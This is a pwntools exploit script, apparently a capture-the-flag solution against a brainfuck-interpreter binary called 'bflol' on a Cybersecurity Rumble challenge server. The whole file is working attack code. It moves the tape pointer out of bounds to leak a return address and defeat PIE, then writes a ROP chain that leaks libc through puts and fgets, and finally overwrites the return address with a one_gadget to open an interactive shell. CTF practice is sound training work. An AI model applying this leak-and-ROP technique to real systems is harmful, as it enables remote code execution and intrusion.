#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./bflol")

context.binary = exe


def conn():
        return process([exe.path])


payload = b""

def shift_left(n):
    global payload
    payload += b"<"*n
    
def shift_right(n):
    global payload
    payload += b">"*n

def write_qword():
    global payload
    payload += b"<,"*6

def leak_qword():
    global payload
    payload += b"<."*8



def main():
    global payload
#    r = conn()
    r = remote("chal.cybersecurityrumble.de", 19783)
    
 
    shift_left(8+4)
    leak_qword()
    shift_right(2+4)
    write_qword()   #Pop R15
   
    
    shift_right(6+8+4+4+4+4) #PopRdi
    write_qword()

    
    shift_right(4+2+8) #Rdi value
    write_qword()

    
    shift_right(4+2+8) #Call puts
    write_qword()
    
    shift_right(4+2+8)
    write_qword()


    pause()

    log.warn("Payload length : %d", len(payload))
    r.sendline(payload)

    
    exe.address = u64(r.recv(8)[::-1]) - 252 - exe.sym['main']
    log.warn("EXE base 0x%x", exe.address)
    
    PopRsiR15 = p64(exe.address + 0x0000000000001511)[:-2:][::-1]
    PopR15 = p64(exe.address + 0x0000000000001512)[:-2:][::-1]
    PopRdi = p64(exe.address + 0x0000000000001513)[:-2:][::-1]
    Rdi_Value = p64(exe.got['fgets'])[:-2:][::-1]
    Call_puts = p64(exe.plt['puts'])[:-2:][::-1]
    main = p64(exe.sym['main'])[:-2:][::-1]
    
    r.send(PopRsiR15 + PopRdi + Rdi_Value + Call_puts + main) #+ PopRdi + Rdi_Value + Call_puts)

    LEAK = u64(r.recvline().strip().ljust(8, b"\x00"))
    
    LIBC_BASE = LEAK - 0x6ff40
    
    one_gadget = LIBC_BASE + 0xe5456
    

    log.warn("Libc leak @ 0x%x", LEAK)
    
    payload = b""
    
    shift_left(8+4)
    leak_qword()
    shift_right(2+4)
    write_qword()   #Pop R15
    
    r.sendline(payload)
    r.sendline(p64(one_gadget)[:-2:][::-1])
 

    
    r.interactive()


if __name__ == "__main__":
    
    main()
